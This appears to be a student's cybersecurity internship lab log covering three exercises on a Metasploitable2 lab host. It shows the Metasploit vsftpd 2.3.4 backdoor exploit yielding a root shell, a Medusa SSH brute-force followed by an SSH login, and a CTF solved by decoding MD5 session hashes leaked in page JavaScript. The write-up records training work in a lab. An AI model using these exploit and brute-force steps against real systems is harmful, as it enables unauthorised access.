# Day 8 – Metasploitable2 Exploitation and CTF Challenges

## 💥 Metasploit - VSFTPD v2.3.4 Exploit (Backdoor Command Execution)

### 🔍 Step-by-Step Procedure

1. **Search for the Exploit:**
   ```bash
   search vsftpd 2.3.4
   ```

2. **Use the Exploit Module:**
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```

3. **Set RHOST:**
   ```bash
   set RHOST 172.16.26.208
   ```

4. **Run the Exploit:**
   ```bash
   run
   ```

5. **Shell Access Achieved:**
   - Once the exploit succeeds, it spawns a backdoor and connects to the target.
   - You gain command shell access as the user `root`.

6. **Commands Executed:**
   ```bash
   whoami  # Output: root
   ls      # Listing directories and files
   ```

## 🧪 Medusa - Brute Force Login (SSH)

### 📂 Files Created
- `user.txt` and `password.txt` created with combinations of users and passwords.

### 🔍 Command:
```bash
medusa -h 172.16.26.208 -U user.txt -P password.txt -M ssh
```

### ✅ Successful Login:
- Username: `msfadmin`
- Password: `msfadmin`

### 🔐 SSH into Target:
```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@172.16.26.208
```
![m1](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/m1.jpg)
![m2](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/m2.jpg)
![m3](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/m4.jpg)
![m5](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/m5.jpg)

## 🕵️‍♂️ CTF Challenge: HeartConnect — Find the Flag

### 🎯 Objective
Find the hidden flag on a dating-themed website — no exploitation needed. Just observation.

### 🧭 Walkthrough

#### Step 1: Load Profile Page
Each profile contains a unique `data-user-id` and username:
```html
<div class="card profile-card" data-user-id="0d107d09f5bbe40cade3de5c71e9e9b7" data-profile-user="arjun_singh">
```

#### Step 2: Inspect JavaScript
At the end of the HTML, JavaScript defined session hashes:
```js
const userSessions = {
    'priya_sharma': '25d55ad283aa400af464c76d713c07ad',
    'rahul_patel': 'e10adc3949ba59abbe56e057f20f883e',
    'sneha_gupta': '5f4dcc3b5aa765d61d8327deb882cf99',
    'arjun_singh': '098f6bcd4621d373cade4e832627b4f6',
    'kavya_reddy': '81dc9bdb52d04dc20036dbd8313ed055'
};
```

MD5 values decoded:
| Username       | MD5 Hash                             | Plaintext   |
|----------------|--------------------------------------|-------------|
| priya_sharma   | 25d55ad283aa400af464c76d713c07ad     | 12345678    |
| rahul_patel    | e10adc3949ba59abbe56e057f20f883e     | 123456      |
| sneha_gupta    | 5f4dcc3b5aa765d61d8327deb882cf99     | password    |
| arjun_singh    | 098f6bcd4621d373cade4e832627b4f6     | test        |
| kavya_reddy    | 81dc9bdb52d04dc20036dbd8313ed055     | 1234        |

#### Step 3: Decode `data-user-id`
```html
data-user-id="0d107d09f5bbe40cade3de5c71e9e9b7" → MD5 → "letmein"
```

#### Step 4: Visit the URL
```bash
/profiles?user_id=0d107d09f5bbe40cade3de5c71e9e9b7
```

✅ Flag was found on the page!

---

🎉 **Final Flag:**
```
flag{congrats_you_pwned_the_ssti_and_cookie_auth}
```
